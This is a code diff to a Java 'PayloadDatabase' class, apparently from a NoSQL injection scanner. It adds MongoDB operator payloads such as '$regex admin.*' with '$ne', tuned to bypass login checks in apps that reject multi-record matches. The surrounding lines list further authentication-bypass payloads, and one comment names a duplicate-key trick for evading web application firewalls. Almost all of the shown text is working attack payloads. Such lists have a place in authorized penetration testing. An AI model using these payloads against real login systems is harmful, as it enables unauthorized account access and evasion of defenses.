@@ -286,6 +286,7 @@ public class PayloadDatabase {
         payloads.add(userField + "[$gt]=admin&" + userField + "[$lt]=test&" + passField + "[$ne]=nosqli");
         payloads.add(userField + "[$in][]=admin&" + userField + "[$in][]=user&" + userField + "[$in][]=administrator&" + passField + "[$gt]=");
         payloads.add(userField + "[$exists]=true&" + passField + "[$exists]=true");
+        payloads.add(userField + "[$regex]=admin.*&" + passField + "[$ne]=");
         payloads.add(userField + "=admin&" + passField + "[$ne]=nosqli_impossible_xyz");
         payloads.add(userField + "=administrator&" + passField + "[$ne]=nosqli_impossible_xyz");
         payloads.add(userField + "=root&" + passField + "[$ne]=nosqli_impossible_xyz");
@@ -306,7 +307,10 @@ public class PayloadDatabase {
         payloads.add("{\"" + userField + "\": {\"$regex\": \".*\"}, \"" + passField + "\": {\"$regex\": \".*\"}}");
         payloads.add("{\"" + userField + "\": {\"$exists\": true}, \"" + passField + "\": {\"$exists\": true}}");
         payloads.add("{\"" + userField + "\": {\"$nin\": [\"nosqli_impossible_xyz\"]}, \"" + passField + "\": {\"$nin\": [\"nosqli_impossible_xyz\"]}}");
-        payloads.add("{\"" + userField + "\": {\"$gt\": undefined}, \"" + passField + "\": {\"$gt\": undefined}}");
+        // Single-account regex: apps that error when the query matches more
+        // than one record ("unexpected number of records") — this matches only
+        // admin-ish accounts, so exactly one record is returned.
+        payloads.add("{\"" + userField + "\": {\"$regex\": \"admin.*\"}, \"" + passField + "\": {\"$ne\": \"\"}}");
         payloads.add("{\"" + userField + "\": {\"$in\": [\"admin\", \"administrator\", \"root\", \"Admin\"]}, \"" + passField + "\": {\"$gt\": \"\"}}");
         payloads.add("{\"" + userField + "\": \"admin\", \"" + passField + "\": {\"$ne\": \"nosqli_impossible_xyz\"}}");
         // Duplicate key WAF bypass (MongoDB uses last key)
